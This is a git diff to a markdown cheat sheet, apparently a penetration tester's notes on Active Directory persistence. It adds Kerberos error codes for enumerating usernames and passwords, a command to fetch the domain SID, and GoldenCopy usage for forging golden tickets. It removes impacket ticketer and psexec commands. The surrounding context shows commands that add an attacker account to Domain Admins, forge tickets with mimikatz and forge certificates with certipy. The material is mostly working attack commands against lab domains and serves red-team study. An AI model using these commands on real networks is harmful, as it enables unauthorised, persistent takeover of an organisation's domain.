@@ -1,5 +1,11 @@
 # Persistence AD
 
+* KDC_ERR_PREAUTH_FAILED: Incorrect password
+* KDC_ERR_C_PRINCIPAL_UNKNOWN: Invalid username
+* KDC_ERR_WRONG_REALM: Invalid domain
+* KDC_ERR_CLIENT_REVOKED: Disabled/Blocked user
+
+
 ## Add user to domain
 
 ```cmd
@@ -8,12 +14,27 @@ net group "Domain Admins" attackerUser /add /domain
 
 ## Golden Ticket
 
+### Get Domain SID
+
+```powershell
+(Get-ADDomain).DomainSID 
+# o 
+Bloodhound > Domain > Object ID
+```
+
 ### Linux
 
+> With `-nthash` gives an error
+
+[Golden Copy](https://github.com/Dramelac/GoldenCopy)
+
 ```bash
-python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
-export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
-python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
+# Using GoldenCOpy
+python3 -m pip install GoldenCopy
+goldencopy administrator@domain.com -u neo4j -p 'neo4j' -k 39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b -t ticketer
+#copy commaand and execute with -aesKey
+export KRB5CCNAME=/path/to/Administrator.ccache
+# Execute psexec, crackmapexec or evil-winrm
 ```
 
 ### Windows
@@ -29,6 +50,8 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 ```
 
 ## Silver Ticket
+
+> This ticket is used to access the functionalities available in the SPN
 
 ### Linux
 
@@ -98,3 +121,4 @@ certipy forge -ca -pfx <ca private key> -upn user@domain.com -subject 'CN=user,C
 - https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/persistence/dsrm
 - https://pentestlab.blog/2021/11/15/golden-certificate/
 - https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/
+- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets
